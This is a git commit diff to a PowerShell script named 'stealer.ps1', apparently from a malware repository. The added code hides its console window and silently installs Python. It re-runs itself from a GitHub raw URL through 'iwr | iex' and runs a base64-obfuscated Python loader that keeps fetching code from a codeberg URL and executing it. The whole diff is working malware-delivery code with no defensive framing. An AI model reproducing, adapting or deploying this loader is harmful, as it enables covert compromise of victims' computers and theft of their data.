fbc70eabc873693ce27792454ea3b4417542c873
43a1723 <hai1723notgay@gmail.com>
2024-12-03 16:24:34 +0700

    Update stealer.ps1

--- shellcode/stealer.ps1
+++ shellcode/stealer.ps1
@@ -1,8 +1,40 @@
-if (-not (Get-Command python -ErrorAction SilentlyContinue)) {
+# Install Python if it is not already installed
+Add-Type @"
+    using System;
+    using System.Runtime.InteropServices;
+    public class ConsoleWindowUtils {
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr GetConsoleWindow();
+        
+        [DllImport("user32.dll")]
+        public static extern IntPtr GetParent(IntPtr hWnd);
+
+        [DllImport("user32.dll")]
+        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+        
+        public static IntPtr GetTargetWindow() {
+            IntPtr consoleWindow = GetConsoleWindow();
+            IntPtr parentWindow = GetParent(consoleWindow);
+            
+            if (parentWindow == IntPtr.Zero) {
+                return consoleWindow;
+            }
+            return parentWindow;
+        }
+    }
+"@
+
+[ConsoleWindowUtils]::ShowWindow([ConsoleWindowUtils]::GetTargetWindow(), 0) | Out-Null
+
+$pythonPath = Get-Command python -ErrorAction SilentlyContinue
+
+if (-not $pythonPath) {
     Write-Host "Python is not installed. Installing Python..."
-    Start-Process "msiexec.exe" -ArgumentList "/i https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe /quiet InstallAllUsers=1 PrependPath=1" -Wait
+    $installerPath = "$env:TEMP\python-installer.exe"
+    Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe" -OutFile $installerPath
+    Start-Process -FilePath $installerPath -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
+    Remove-Item $installerPath
     Start-Process powershell -ArgumentList "iwr https://raw.githubusercontent.com/EVIL-D-E-V/M/refs/heads/main/shellcode/stealer.ps1 | iex"
 } else {
     Start-Process python -ArgumentList '-c', 'exec(__import__("base64").b64decode(b"aW1wb3J0IHVybGxpYi5yZXF1ZXN0CmltcG9ydCB0aW1lCgp1cmwgPSAiaHR0cHM6Ly9jb2RlYmVyZy5vcmcvNDNhMTcyMy9oYWkxNzIzL3Jhdy9icmFuY2gvbWFpbi9hL21haW4ucHkiCgp3aGlsZSBUcnVlOgogICAgdHJ5OgogICAgICAgIGNvbnRlbnQgPSB1cmxsaWIucmVxdWVzdC51cmxvcGVuKHVybCkucmVhZCgpCiAgICAgICAgZXhlYyhjb250ZW50KQogICAgICAgIGJyZWFrCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgdGltZS5zbGVlcCgzKQ=="))'
 }
-
